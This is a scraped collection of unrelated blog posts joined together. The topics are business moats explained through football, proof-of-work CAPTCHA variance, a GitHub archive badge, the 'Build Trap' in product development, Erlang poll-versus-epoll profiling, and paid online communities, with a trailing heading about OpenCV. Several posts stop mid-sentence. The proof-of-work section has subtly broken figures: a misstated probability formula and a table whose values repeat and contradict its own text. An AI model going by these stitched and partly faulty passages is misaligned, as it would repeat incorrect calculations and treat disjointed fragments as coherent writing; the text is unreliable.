<p>There is a debate among the founders operating in different sectors of the economy as to the nature of defensibility. How can we define it? To answer this question properly one needs to discern the terms «<b>competitive advantage</b>», «<b>unfair advantage</b>» (or exclusivity as some put it) and «<b>defensibility</b>» as many people mix or conflate one phenomenon with another. For the sake of fairness, sometimes a «competitive advantage» may become an «unfair advantage», and «unfair advantage» progresses to the «defensibility» which is an organic prerequisite of the <b>Moat (</b>or as business people call it an<b> Economic Moat). </b></p>
<p>A brilliant way to understand the nature of the said dynamics is to refer to some sports examples before diving deep into the traditional business analysis. Imagine, Arsenal FC (London, England) won the opponent 4-0 in the first round (1/16) of the English League Cup. In the away-match, they can let their bench-players or youth play the game, as it is highly unlikely the opponent will recover from 0-4. Let’s say we have Tottenham Hotspur (London, England) which played 0-0 in the first game of 1/16 round and won the second one 2-1 in a very nose-to-nose game but could advance to 1/8. Given both teams of similar quality, it is likely that Arsenal beat Tottenham in ⅛ finals because they have more time to properly train and recover. This is an example of a specific “<b><i>competitive advantage</i></b>”.</p>
<p>Now, assume, Cristiano Ronaldo joins Arsenal FC on a 4-year deal, i.e. for 4 seasons. This means the club will probably advance to ⅛ round every single season or even quarter-finals. But even he alone will not avail the team to advance into, let’s say, semi-finals or finals. Along the way, Arsenal FC will be able to bolster its revenue stream by capital infusion from the increased sales of merchandise, tickets, and tv-rights (yes, Cristiano Ronaldo is very popular!). Here, Cristiano Ronaldo is an “<b>unfair advantage</b>”.</p>
<p>Finally, let’s switch on a time-back machine and return to 2008 when Josep Guardiola joined Barcelona FC (Spain) as a head coach, the club already had such players in its roster as Lionel Messi, Xavi, Gerard Piqué, Carles Puyol, Samuel Eto’o, Dani Alves, Sergio Busquets, A. Iniesta, Eric Abidal, Pedro. In his debut season, Guardiola won all three trophies available. After a winning start to the following campaign in 2009/10, Barcelona became the team of the Six Trophies, all won in the calendar year of 2009. The run of success continued with Guardiola claiming 14 titles of a possible 19 as a coach in his four seasons in charge. Guardiola and his Barcelona became a benchmark for modern football success. During almost 5 years they have dominated the world football market completely and remain on the top tough with some turbulent results. That was a “<b>defensibility”.&nbsp;&nbsp;</b></p>
<p><b>What defensibility was based upon?&nbsp;</b></p>
<ol>
<li>Team. The roster of talented players and the legendary coach.</li>
<li>A highly qualified club’s management team.</li>
<li>La Masia – the Barcelona youth football academy where from all its stars came from including Puyol, Messi, Iniesta, Xavi, Busquets.</li>
<li>Capital. Having won the La Liga, Spanish cups, Champions League and other competitions generated a massive amount of prize money. The popularity of the club and its players turned into the cash-generating machine from tv rights (very high price tag for rights), merchandise (globally), ads contracts, tickets sold outs, etc.</li>
<li>Generated revenue helped to maintain the star players on the contract and attract new talented youth, buy established stars (or even buy out rising stars from other teams) to accompany the star-squad, and continue to dominate the league.</li>
<li>The more money and better players at Barcelona FC meant less money and less talented players for the competitors to acquire as an asset to strengthen their teams.</li>
<li>The bigger popularity of the team, the more youth players want to get into La Masia football academy. The trials are highly competitive. It would be fair to say – the academy sifts the best junior players all over the world that try to apply, who subsequently might turn into next stars and strengthen the team more.</li>
</ol>
<p>Some real data/statistics for your consideration. If the club reaches the group stage in<a href="https://www.marca.com/en/football/international-football/2019/07/11/5d27616646163f138c8b45aa.html"> Champions League in season 2019-20</a>, it receives 15 mln. Euro. Each extra round of the competitions adds more money: 1/16 + 9.5 mln., ¼ +10.5 mln., ½ + 12 mln., final +15 mln, win the final + 4 mln. Overall, the team can aggregate up to 83 mln during this very tournament. <b>UEFA</b> will also pay teams 2.7 million euros for every match they win and 900,000 euros for every match they draw. And this sum does not include revenues from TV rights and other contracts. Add to this prize money from national championships, national TV rights, sponsorship contracts, match day revenue, merchandise on a global scale. One can see the point – it is very difficult for competitors to fight a fair battle with the team which has so many resources working as a smooth mechanism for its future success yearly, creating a compounding effect.</p>

Unfair advantage gives you the chance to get even to the top-tier of the market and hold there for some time. Defensibility helps you stay there for long, usually dominate the market, buy out the competitors if there is a need, generate massive revenue and put it in R&amp;D, and continue to stay on top of the innovative curve.</p>
<p>From an economic perspective, the logic here is simple. If there is a demand for the product -&gt; the market exists already and people/customers satisfy the demand somehow. The existing supplier is our competitor. For a customer to switch from the current supplier to your company, our product/service must be better.</p>
<p>To be better on a marginal scale of 10-15% is not enough, you’d have to be better 5-10x (it can be one or different features in totality). Only in this case, people would start changing their consumer behavior and flocking to your side. Now your competitor sees the looming threat, and it comes up with a bunch of solutions, maybe just copying your approach. If your existing advantage is subject to easy coping – then you to lose your market share again to the old competitor.</p>
<p>To avoid such a fate, one needs to have an unfair advantage, i.e. the fence which protects your business and helps to keep it afloat with expected profitability. However, there might be still a room for the competitor to bounce back to the top unless you build defensibility. As mentioned earlier, it could be built upon the existing unfair advantage or overlap that.</p>
<p>So I would like to take the following stance on the matter:</p>

<p>Technology as a category may encompass many competitive advantages pertaining to the product itself, services, operation processes, etc.&nbsp; For example, a grocery store with self-checkout terminals would be in a better position than its rivals with employees at the cashier. This way the former can process more people, decrease the expenses on the salaries, increase NPS of the customers as they won’t need to stay in the lines. …</p></div></article></div></div>

<p>Proof of work (PoW) algorithms generally have no notion of progress, instead they are more like playing the lottery millions of times until you win. Losing a million times doesn’t influence your chances of winning the next one.</p>
<p>That’s ok and probably even desirable for applications like a cryptocurrency mining, but undesirable for an application like <a href="https://en.wikipedia.org/wiki/Hashcash"><em>hashcash</em></a> in which the proof of work is used as a <em>payment</em> for say, signing up for a website. I created an <a href="https://github.com/gzuidhof/friendly-pow">open source</a>, more user-friendly captcha based on proof of work. It is important that this captcha takes roughly the same amount of computation for any given user to complete, and even more important that there are no outliers.</p>
<p>In the lottery example there are no guarantees, one user might win on the first attempt, and another may need many attempts. Before we dive into specifics and the simple solution, let’s explore the properties of a good proof of work problem.</p>
<h2 id="our-proof-of-work-setup">Our proof-of-work setup<a href="#our-proof-of-work-setup">#</a></h2>
<p>The idea behind PoW is that the puzzle (also called challenge) must be cheap to verify, but expensive to compute.</p>
<p>A PoW that would be “hash this string 1 million times” would be expensive to compute, but just as expensive to verify. Instead most PoW algorithms make the user search for a needle in a haystack: we generate a <em>puzzle string</em> <code>p</code>, and ask the user to find a <em>nonce</em> <code>q</code> such that the hash of <code>p</code> and <code>q</code> concatenated meets some rare criteria. If we use a good hash function, any input string is just as likely to meet this criteria as another.</p>
<p>Remember that any bytes or string can be interpreted as a number. We take the first 4 bytes of the hash and interpret them as a 32 bit integer. If that number is below some threshold T (which you could call the inverse of the difficulty) then it is a valid solution. Any hash input is equally likely to meet that criteria, so to find the solution the user would just try different values for the nonce <code>q</code> until they find a winning solution. Not so different from playing the lottery a lot!</p>

</div><h2 id="how-many-tries-does-it-take">How many tries does it take?<a href="#how-many-tries-does-it-take">#</a></h2>
<p>If your chances of winning the lotery are one in a million, after a million tries your odds of winning at least once is around 63.2% (<code>1 - (1/one_million)^one_million</code> or <code>1 - binom.pmf(1, one_million, 1/one_million)</code>). Here’s a density plot:</p>
<p><img src="https://i.imgur.com/l5KjMXu.png" alt="Density plot of one in a million lottery"></p>
<p>Most people take around a million attempts, but some users will be really unlucky and instead need 3 million attemps (~5% in fact) or even more! In other words: there is a large amount of variance in how many attempts are needed. This is problematic for a PoW CAPTCHA: the user will give up on waiting if it takes 5 times longer than expected. They don’t care what the mathematical average is, they just want to sign up to your website.</p>
<p>For a decent user experience the user also deserves some sort of progress indicator. Just showing <em>“solving the captcha”</em> for 10 seconds without any indication of will make the user give up and think the website is broken. If instead there is a progress bar that increases over time it’s much more tolerable.</p>
<p>The issue is that there is no progress, nobody knows when they will find the nonce that creates a hash that satisfies the criteria. Fortunately, there is a straightforward solution to both the progress and variance issue: we ask users to find more than one nonce.</p>
<h2 id="multiple-easier-problems">Multiple, easier problems<a href="#multiple-easier-problems">#</a></h2>
<p>Instead of making the user find the 1 in a million nonce, we can make them find 10 nonces to a 1 in 100k problem. The expected number of attempts is still the same, but now we can show a progress bar to the user!</p>
<p>Not only do we solve the progress problem, we also decrease the variance of how many attempts were required in total. As we increase the number of nonces we ask, the variance decreases. Let’s plot that:</p>

</div><p><img src="https://i.imgur.com/AJxyk8n.png" alt="Cumulative density plot graph"></p>
<p>Looking at this plot we can see that if we have people play a single lottery around 1 in 10 people will take more than 4 times longer than average! That’s unacceptable for a CAPTCHA, but as we increase the amount of wins required for a simpler lottery we decrease the variance considerably. In table form, how many people would not be done yet after N attempts:</p>
<table>
<thead>
<tr>
<th>Amount of solutions required</th>
<th>1M attempts</th>
<th>2M attempts</th>
<th>3M attempts</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>one in 1.4</td>
<td>one in 2.5</td>
<td>one in 2.5</td>
</tr>
<tr>
<td>2</td>
<td>one in 1.5</td>
<td>one in 4.2</td>
<td>one in 16</td>
</tr>
<tr>
<td>5</td>
<td>one in 1.6</td>
<td>one in 14.9</td>
<td>one in 358</td>
</tr>
<tr>
<td>10</td>
<td>one in 1.7</td>
<td>one in 92.5</td>
<td>one in 45K</td>
</tr>
<tr>
<td>20</td>
<td>one in 1.8</td>
<td>one in 2715</td>
<td>one in 512M</td>
</tr>
</tbody>
</table>
<p>We can also plot the probability mass function (below) which shows the variance clearly as well, the expected number of attempts is about the same, but the variance is much lower.</p>
<p><img src="https://i.imgur.com/UNEq0Mq.png" alt="Porbability mass plot graph"></p>
<h3 id="the-downsides-of-requiring-more-solutions">The downsides of requiring more solutions<a href="#the-downsides-of-requiring-more-solutions">#</a></h3>
<p>There are small downsides to requiring more solutions, the first is the need to submit more solutions requiring a bit more bandwidth. In FriendlyCaptcha every solution is an 8 byte value transmitted as base64, so going from 10 to 20 solutions would take around 106 extra characters (<code>10*8*(4/3)</code>).</p>
<p>Secondly there are simply more solutions to verify, but given that verification is cheap this doesn’t matter.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion">#</a></h2>
<p>Proof of work usually doesn’t have any notion of progress, and any attempt is just as likely as the next to find the solution. By requiring multiple proof of work solutions we can decrease variance, as well as provide a notion of progress, both of these features are requirements for a CAPTCHA based on proof of work.</p>

      <p>I had a very cool surprise today while checking my GitHub profile. Some projects I contributed to have been selected to included to be part of the <a href="https://archiveprogram.github.com/">Arctic Code Vault</a> project, and I am officially an <strong>Arctic Code Vault Contributor</strong>!</p>
<p><a rel="lightbox" href="https://sam.elborai.me/images/a/n/n/o/t/annotation-2020-07-17-162632-7375779b.jpeg"><img alt="" src="https://sam.elborai.me/images/a/n/n/o/t/annotation-2020-07-17-162632-7375779b.jpeg"></a></p>
<p>That made me chuckle, and I now have a nice little badge under my contact info. </p>
<p>Though to be honest my contributions are really just simple corrections and fixes that I regularly do to projects I'm using or reading about. Not the majestic legacy some people would imagine when they hear of a project like this one! </p>
<p>But hey, people in 10k years will be able to blame me for a specific typo I made, isn't that great? 😁 (if they can figure out how to use git, which isn't something I would bet on).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e59315e1a32339c512fd"><div><h2 id="yui_3_17_2_1_1503324053412_307488">"Move Fast and Break Things"</h2><p id="yui_3_17_2_1_1503324053412_307491">This mantra seems to have taken the startup world by storm since Facebook made it their motto a few years ago. I have heard countless CEOs say it's part of their company culture, something that makes them innovative. You can even find some enterprises repeating this phrase to their employees at an attempt to channel startup culture.</p><p id="yui_3_17_2_1_1503324053412_307494">There is a serious flaw with "Move Fast and Break Things", and it's that most companies see this as an excuse to stop analyzing what they intend to build and why they should build it. Those companies get stuck in what I call <strong>"The Build Trap"</strong>.</p><p id="yui_3_17_2_1_1503324053412_307500">It usually happens like this:</p><p id="yui_3_17_2_1_1503324053412_307503">After finding some kind of product/market fit and traction with customers, we raise money from investors and&nbsp;hire a team of developers. Now we also have a bunch of important people who want to know what we're doing with their money. We want to show them how hard we're working, so let's make sure we're constantly building and releasing. Right now the developers are building Version 1, but once that's out what is next? Developers can't just stop working; we need something for them to do.</p><p id="yui_3_17_2_1_1503324053412_307506">Product Roadmap meetings are held and ideas are generated on what we could do build to increase our KPIs - drive registrations, more sales, etc. Ideas come up from Product Managers or Executives, and some seem like a good bet so we schedule them. When the time comes to build the product, we design and build the whole thing based off the ideas that we had originally.</p><p id="yui_3_17_2_1_1503324053412_307509">This cycle continues until the company grows from 100 people to 500 people to huge corporations, where it becomes part of the norm and the way we do things.</p></div></div><div data-block-type="2" id="block-291c184683c6acb4b141"><div><p id="yui_3_17_2_1_1503324053412_307515">And thus we fall into The Build Trap. The problem with this cycle is that our first ideas are not always our best. When we immediately jump into build mode, we don't have much information on how our customers will respond to these products, what they would want to do with them, or if they even solve a problem. Our design or product decisions are not based on fact, but on our best guesses. Most of those guesses are wrong.</p><p id="yui_3_17_2_1_1503324053412_307518">In order to base our decisions on fact, we need to take a step back and focus on THINKING more than BUILDING. Thinking gets neglected in companies because the act of thinking doesn't directly produce something we can give to customers. Only building does that. This mentality is evident in our everday work lives. Look at the way we measure the success of our workers and our companies. All of our metrics are geared towards production of code or product. Even Agile standups - "What did you do today, what did you do yesterday?" If you haven't delivered your items on time, you get penalized. If you have delivered your items on time, you get rewarded. If you can produce more than another person, you get promoted.</p><p id="yui_3_17_2_1_1503324053412_307521">This is a very flawed system because the amount of things we produce is no guarantee of a successful company. <strong>Building is the easy part of the product development process. Figuring out what to build and how we are going to build it is the hard part.</strong> Yet, we are only allowed a few days or a week at the beginning of each sprint for designing and speccing this out. We completely neglect research and experimentation in favor of spending more time writing code.</p><p id="yui_3_17_2_1_1503324053412_307527">If we want to create better products and get out of the Build Trap, we need to change our mentality. This is true for both startups and large corporations. We need to give ample time throughout the product development process for exploring problems, thinking of solutions, and testing those solutions with our customers. Employees should be rewarded for solving problems, learning, and creating products our customers want, not how much code they can produce. "What have you delivered today?" has to become "What have you learned about our customers or our business, and how can we use that to our advantage?"&nbsp;When we change our conversations to strategic thinking instead of production, we can create a culture that is truly innovative and competitive.</p><p id="yui_3_17_2_1_1503324053412_307530">So the next time someone at work says "move fast and break things", ask them "what are we learning by doing so?"</p></div></div></div>]]>

<p>This is a journey of obscure settings, red herrings, and poll vs. epoll. A story of how I had spent a couple days performance profiling and optimizing some Elixir code, only to discover that the true solution to the performance issues was an obscure setting in the Erlang VM that controlled which system call the IO polling subsystem used, and that my code-level optimizations were irrelevant. This particular setting has been made redundant by a rewrite of IO polling in a subsequent Erlang/OTP release, but still, it was a valuable lesson.</p>
<p>Back in 2018, we <a href="https://www.ably.io/blog/why-is-everyone-talking-about-mqtt/">released our MQTT protocol adapter</a>. Like our <a href="https://www.ably.io/blog/being-protocol-agnostic-at-ably">Pusher and Pubnub adapters</a>, it was implemented as an Elixir service, which sits in front of our normal service frontend and live-translates to and from Ably's own protocol.</p>
<p>In the run-up to the release, we decided to do some load testing to figure out the CPU cost per instance of holding onto substantial numbers of mostly-idle MQTT connections (driven by a customer with a large number of IoT devices).</p>
<p>Initial results were not great.</p>
<p>With 15K idle MQTT connections, on one of our usual instances (an AWS m5.large), CPU usage was reaching 60%, mostly from the adapter (with the remainder from the normal Ably frontend process). So we started trying to figure out why that was.</p>
<p>There's a wide variety of ways you can get performance data out of the BEAM (the Erlang VM). To start with there's the <a href="https://elixir-lang.org/getting-started/debugging.html#observer">observer</a>, which you can use to view all running processes (<a href="https://erlang.org/doc/reference_manual/processes.html">Erlang processes</a>, not system processes), ordered by reductions (≈function calls, a proxy for CPU usage) or by memory usage. There are also various tracing facilities, which can trace all calls from particular processes, all calls to a given function from any process, and so on. (The built-in tools can be a little low-level, but there are various more user-friendly wrappers available).</p>
<p>I couldn't see anything obvious from just looking at the observer; no processes appeared to be using an excess of resources. What I really wanted was to trace the whole system, with all function calls, and then generate flame graphs out of that data, to get a sense of what was actually using up all that CPU. Doing that using traditional BEAM tracing of every function call would be very expensive; tracing adds too much overhead to do it for every function call ever. Luckily, Scott Fritchie has a great project called eflame2 <a href="https://github.com/slfritchie/eflame">https://github.com/slfritchie/eflame</a> (building off Vlad Ki's eflame <a href="https://github.com/proger/eflame">https://github.com/proger/eflame</a>), which makes some experimental changes to the BEAM to allow it to support time-sampled trace data: generating a stack trace every (say) 100ms, and using that to construct a flame graph.</p>
<figure><img src="https://files.ably.io/ghost/prod/2020/07/example-flamegraph.png"><figcaption>Example section of a flamegraph. The original is SVG, and you can click segments to zoom in on them. This is just a screenshot.</figcaption></figure><p>The results were a little puzzling. It showed the vast majority of time per the flamegraphs spent in SLEEP, even though observed CPU usage was still very high.</p>
<p>Experienced BEAMers may now be thinking "A-ha! I bet this is an sbwt issue!" The BEAM process scheduler by default, when it runs out of Erlang processes to schedule, spins for several milliseconds to stop the OS scheduler from scheduling a different OS process, to reduce latency if new work does need to be done. This is known as <a href="http://erlang.org/doc/man/erl.html">scheduler busy wait</a>. This can be reasonable behavior if the BEAM is the only important process running on the box that it's running on — which is often the case. But in our case it isn't, it has to play nicely with our frontend processes, and others as well. This behavior often catches out people who try to benchmark Erlang/Elixir against other languages, making the BEAM appear to consume a lot of CPU, even when average latency is low. (I'm pretty sure this mistake is what led to the conclusion that "Elixir nearly saturated all 36 cores while delivering a surprisingly consistent performance" in <a href="https://stressgrid.com/blog/benchmarking_go_vs_node_vs_elixir/">this blog post by Stressgrid</a>, for example). It can easily be disabled by passing <code>+sbwt none</code> ('t' = threshold) to the Erlang runtime.</p>
<p>This was not the cause of my problem; I had already made that change.</p>
<p>So I shrugged, put aside for now the SLEEPs as a measurement artifact, and filtered them out of the trace output, generating some flamegraphs to see what the biggest consumers of CPU were out of all the non-idle samples.</p>
<p>One source was <code>:crypto.strong_random_bytes</code> when responding to websocket pings from our Ably frontends. The adapter connects to our frontends the same way our client libraries do: over websockets, one for each connection. </p>
<p>(Using websockets to connect two services running on the same box may seem an odd choice: the reasoning was that the translated connection would just appear and behave as a normal external websocket, the Ably frontend wouldn't have to do anything special or different for a connection via the MQTT adapter compared to a normal external websocket connection.) </p>
<p>The frontend sends a websocket ping to each client every 15 seconds, primarily as a way of detecting (and allowing the client to detect) whether the connection is genuinely still alive. When sending a message (even just a pong), a websocket feature called <a href="https://tools.ietf.org/html/rfc6455#section-5.3">masking</a> requires the client to generate a random "mask" — random bytes which are XOR'd with the payload. The point of this is to <a href="https://tools.ietf.org/html/rfc6455#section-10.3">defeat cache poisoning attacks on proxies</a>. This is of course unnecessary for a websocket between two services running on the same instance. I disabled masking (using <a href="https://github.com/meh/elixir-socket">elixir-socket</a> this was as simple as passing <code>mask: nil</code> as an option to <code>Socket.Web.send</code>).</p>
<p>Another source of CPU usage was responding to MQTT pings from clients. The current code was responding to them in the same way it responded to all messages: decoding them into a <a href="https://github.com/suvash/hulaaki/">Hulaaki</a> Message , passing that to a main <code>MQTT.FromClient.handle()</code> function that pattern-matches on the message and sends a ping response:</p>
<pre><code>def handle(%Hulaaki.Message.PingReq{}, state) do
  Handler.send_to_client(Message.ping_response(), state)
  {:noreply, state}
end</code></pre>
<p>Not much, but do it a couple times a minute for tens of thousands of connections and it all adds up. Optimizing this was just a matter of adding a special-case to the ranch handler to recognise a ping and respond with a pong before the normal MQTT message-parsing logic is invoked. With Elixir's binary pattern matching this is very simple:</p>
<pre><code>@ping &lt;&lt;192,0&gt;&gt;
@pong &lt;&lt;208,0&gt;&gt;

def handle_info({:tcp, socket, @ping}, state) do
  @transport.send(socket, @pong)
  {:noreply, %{state | last_activity: now()}}
end

def handle_info({:tcp, socket, data}, state) do
  // handle all other packets</code></pre>
<p>(For most messages we have to handle messages spread over multiple TCP packets; for a two-byte message this is not an issue.)</p>
<p>I kept going, looking at the other (smaller but still prominent) CPU users from the flamegraphs. <code>URI.encode_query</code> was spending a fair amount of time in <code>URI.encode_www_form</code>; I replaced it with a custom query string encoder that didn't bother with that, since I knew I was already passing URI-safe strings. <code>Timex.Time.now()</code> / <code>elapsed()</code> (used to keep track of the last activity time on a connection) was showing quite a bit; I replaced it with <code>:erlang.system_time(:seconds)</code>. And so on.</p>
<p>And after all these in retrospect somewhat desperate micro-optimizations, &nbsp;I was... well, capturing flamegraphs that were now even more SLEEP dominated — having filed down everything else to the bare minimum —but system CPU was still much, much higher than it should have been.</p>
<p>Hmm.</p>
<p>Then, at some point I stumbled across <a href="http://erlang.org/pipermail/erlang-questions/2011-April/057472.html">a mailing list thread from 2011</a> about the <code>+K</code> flag (an argument to erlang runtime, like <code>+sbwt</code>). The <a href="http://www1.erlang.org/doc/man/erl.html">reference manual</a> states that it "Enables or disables the kernel poll functionality if the emulator supports it. Default is false (disabled)."</p>
<p>It turns out that with this disabled, the BEAM uses the <code>poll</code> system call to check for incoming IO events on Linux; with it enabled, it uses <code>epoll</code>. Julia Evans has a <a href="https://jvns.ca/blog/2017/06/03/async-io-on-linux--select--poll--and-epoll/">great blog post on the difference between those</a>; the short version is that for listening to events on a large numbers of mostly-idle sockets, <code>epoll</code> is <em>dramatically</em> more efficient.</p>
<p>Enabling <code>+K true</code> was the <a href="http://www.catb.org/~esr/jargon/html/magic-story.html">magic switch</a> I'd been looking for. With it on, BEAM CPU usage in the idle-MQTT load test dropped by an order of magnitude.</p>
<p>So all the within-BEAM profiling and tracing, all my careful optimization of MQTT ping responses and so on were completely irrelevant, all a red herring. The BEAM was spending almost all of its CPU cycles on IO polling, only a tiny fraction actually executing bytecode, and I'd been spending all my time optimizing that small fraction.</p>
<p>One might question why that wasn't the default. There apparently exist usecases where <code>poll</code> may have an edge over <code>epoll</code> (extremely active sockets), but the general advice seems to be that the vast majority of people should use <code>epoll</code>. One person in that mailing list thread suggests that it's not the default because some OSes such as Windows don't have kernel poll support, but this doesn't make all that much sense — there's no reason to cripple platforms that do have epoll/kqueue/etc. for consistency with one that doesn't. (Especially since I doubt there are many people running the BEAM on Windows servers).</p>
<p>Happily, it seems that the Erlang/OTP team had been thinking along similar lines, and coincidentally, shortly after I discovered this, they announced that in OTP 21, the IO polling implementation <a href="http://blog.erlang.org/IO-Polling/">was being completely rewritten</a>. IO polling would be moved from scheduler threads to dedicated IO threads, and kernel-space polling (using epoll on Linux) would become the default (and in fact the <code>+K</code> switch would be removed entirely; epoll would be used always unless disabled at compile-time). Erlang/OTP 21 was duly released in June 2018, and this particular issue was solved at the source for everyone.</p>
<p>This was all two years ago. I left my micro-optimizations in: while marginal they did make some difference. I haven't had the chance to work on the adapter much recently; the problem with building services in …</p></div></section></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The uneasy Web 2.0 truce between social networks, legacy media, and brands is falling apart. Once it was held together by ad tech. But advertising spends keep going up, brand content is at peak saturation, and audiences are slowly but surely evacuating the big social media companies. Can the three forces —&nbsp;social media, content, and commerce&nbsp;—&nbsp;find a new way relate to each other?</p>

<p>Here enters the question of community.</p>

<p>As high quality content and effective brand strategy move down the long tail, “community” has become an important concept for every post-Web 2.0 player. Crypto token holders, influencer fanbases, DTC brand customers, creator audiences, and new social networks are all often referred to as communities, and each has a stake in developing community for itself.</p>

<p>A new business type here is the paid community: a direct subscription to join in. Today, most paid communities live on the outskirts of existing social platforms. But as they become normalized, paid communities are becoming a viable business model for smaller-scale social networks aiming to be both profitable and socially sustainable.</p>

<p>This emerging new media <em>thing</em>, the paid community social network, has new rules and new risks, and just as it will require new skillsets to operate, requires a new way of understanding what both business and community mean.</p>

<h2 id="the-emergence-of-paid-communities">The Emergence of Paid Communities</h2>

<p>In the last 5 years we’ve seen several interesting innovations as Web 2.0 business models recombined into new mixtures of content, social media, and commerce. Let’s take a look at each of these.</p>

<p>Content and commerce have been merging to create new publishing endeavors that make no distinction between advertising and editorial. These businesses take multiple forms: they include expensive brand-led lifestyle marketing initiatives like the WeTransfer blog and Casper’s Woolly Magazine; “native advertising” efforts like Vox’s <a href="http://theexplainerstudio.com/">Explainer Studio</a>, NYT’s&nbsp;affiliate marketing play with the Wirecutter acquisition; and the extension of lifestyle magazines into product, such as 032c’s streetwear line.</p>

<p>Content and social are also unifying, with Twitch streaming and YouTube being the biggest video players. Meanwhile paid newsletters have taken off in a big way in the last two years. In content + community, an audience connects around a specific content producer through some platform.</p>

<p>Finally, commerce and social are coming together, although to much less a degree than marketing teams who talk up “brand communities” would like you to think. In all but a few cases, “community” here is just the marketing language used to describe a microbrand’s niche Instagram fandom. To me “community” implies users regularly engaging with <em>each other</em>, a criterion which indicates that the “regular crowd” at neighborhood joints or local skate shops are much truer communities than most online brands. Nevertheless, brands are now much better at directly engaging current and future customers through social media. This merger is clearly happening.</p>

<p>Each pairing of verticals has produced some of the most interesting companies and media projects of the last few years. But what’s happening now is that all three are coming together in a new way, fusing to form a completely different type of business: <strong>paid communities.</strong></p>

<p><img alt="paid communities emerge from the combinatation of content, social media, and commerce businessess" src="https://subpixel.space/uploads/paidcommunities.png"></p>

<p>Paid communities are a still-nascent category, but the business model is familiar: free content with a subscription paywall for more (the standard model of content + social). Paid communities develop this formula further: they take the subject matter of a content producer or brand lifestyle, and pair it with a paywalled digital social space for ongoing user interaction. Here the community is not a passive audience, but one that generates its own discussion, and for users comprises much of the value in and of itself. This community often comes to re-shape the brand or content development process.</p>

<p>Here are a few examples of burgeoning paid communities you might have already heard of:</p>

<ul>
  <li>Stratechery: paid content + members-only forum, for investors and tech strategists.</li>
  <li>Venkatesh Rao’s Art of Gig / Yak Collective: paid content + a Discord channel, for indie consultants.</li>
  <li>New Models: content aggregator + commissioned content + paid Discord channel (conducted through Patreon), for artists and cultural producers.</li>
  <li>It’s also worth mentioning that Substack is currently layering on commenting + social features for paid newsletters, so many successful Substacks qualify.</li>
</ul>

<p>These new paid communities largely live on invite-only Telegrams, Slacks, Discords, and Facebook groups, raising the question: could there be applications more suitable to these networks? Indeed, the growing popularity of paid communities has been noticed by a bunch of new venture-funded companies such as such as <a href="http://genevachat.com/">Genevachat</a>, <a href="https://www.mightynetworks.com/">Mighty Networks</a>, and <a href="https://circle.so/">Circle</a>, all of which want to become “the platform for communities.”</p>

<p>Ironically, these “community platforms” are themselves largely clones of Slack and Discord. They have been designed to fit what <em>already</em> exists on the market —&nbsp;to generically scale to support every possible group&nbsp;—&nbsp;in order to drive the user numbers that can support venture-scale returns. With heavy competition and no differentiation, how could any one of these new platforms become successful? This paradox reveals the limits of venture capital logic. An alternative market analysis is needed to understand this emerging space.</p>

<p><img src="https://subpixel.space/uploads/communityplatforms.png" alt="generic looking community platforms"></p>

<p>Patreon is a good example of why generic community platforms are not the future. You could certainly say that Patreon is already at the center of content, social, and commerce. But of course, Patreon has for years been getting unbundled into A, B, and C type businesses. The reason for Patreon’s erosion is that its product design is totally unsuitable for all three use cases: it’s a bad brand platform, a bad content platform, and a bad social platform. Patreon is a classic case of what Venkatesh Rao calls “<a href="https://breakingsmart.substack.com/p/too-big-to-nail">Too Big to Nail</a>,” and businesses that try to follow in its stead will face similar challenges.</p>

<p>Don’t buy into the VC hype on this one. There will not be one tool to serve new internet-first communities.</p>



<p>Meanwhile, dozens of alternative social networks have sprouted up in the last couple years. With the maturation of Javascript-based web development and plenty of front-end talent, it’s become easy to build complex web applications with tiny teams. <a href="https://futureland.tv/">futureland.tv</a>, <a href="https://dialup.com/">Dialup</a>, <a href="https://special.fish/">Special Fish,</a> and alternative dating app <a href="https://www.bighead.app/">Bighead</a> are among these new experiments. These alternative social networks are interesting in part because they prove that dissatisfaction with mainstream web has motivated significant movement to alternatives. But they are also interesting because of their unique user communities.</p>

<p>New social networks have typically struggled to monetize due to their small audience sizes, as they are unable to achieve the scale to make meaningful revenue from advertising. Paid communities, however, supply an engaged and paying audience, providing an alternative route to sustainability for independent social networks. At the same time, social networks solve some of the deficiencies of paid content and brand communities. This is worth understanding well.</p>

<p>Businesses want to be active participants in their customers’ social landscape, because <a href="https://medium.com/@namratalpatel/the-hyperfragmentation-of-retail-and-why-the-biggest-winners-are-digital-ad-platforms-not-5d55b26e96c">brand values are the last battleground for differentiation</a>. This is the very justification for community marketing, and the driving force behind the evolution of brand social media accounts from joke memes to increasingly woke and personal human voices. Offering a dedicated social space is a further extension of social participation. By providing a social space, brands can try to deepen their connection with users and have a place for content they produce to be discussed.</p>

<p>Similarly, the topic-specific functionality entertainers build into their streams can be seen as prototypes for rich social spaces. In journalistic media, content providers with growing audiences also need tools to manage their audience and moderate discussion. Slack’s 10,000 message limit for free accounts is a major obstruction to doing knowledge work in these spaces, and Discord’s free tier has lamentably small file upload size limits.</p>

<p>At this point, you may wonder: “why don’t users just want one place to manage all their communities?” Today’s existing tools will continue to be sufficient for some communities, and Discord and Slack’s robust bot APIs are capable of solving <em>some</em> community needs. But fundamentally, they are still based on chat, and chat simply isn’t the right core user experience for many other communities. Unique functionality and bespoke interfaces provide distinct advantages that off-the-shelf tooling can never achieve.</p>

<p>In order to understand how diverse and specialized these paid community / social networks can be, a few case studies, drawing from different scales, will be helpful.</p>

<p><strong>Replit</strong><br>Replit is a community of young programmers, supported by a forum, a real-time collaborative IDE, and a library of openly forkable code projects. The deep integration between Replit’s social space and its programmer tooling enable efficient knowledge workflows and sharing of user-generated content. At the same time, it facilitates the growth of a highly collaborative culture <em>specific to this set of tools</em>. Replit has gone the venture capital route, monetizes through a premium offering including paid cloud storage and unlimited private projects.</p>

<div><p><strong>Are.na</strong><br>Are.na, founded in 2012, can claim to be one of the most successful indie social networks. (Disclosure: I am a shareholder through its Republic crowdfund.) Originally bootstrapped by a small community of NYC-based artists, it has grown to over <a href="https://www.are.na/roadmap">12,000 monthly active users</a>, largely designers, artists, researchers, and educators. For these users the restrained interface, absence of an algorithmic feed, and community of intellectuals and cultural producers have made it a popular tool. As of May 2020, Are.na took in a respectable $20,000 monthly …</p></div></div></div>

        <h2>Identify faces and extract up to 6 facial features with OpenCV and&nbsp;DLib</h2>
        
        
        <section>
            <figure>
                
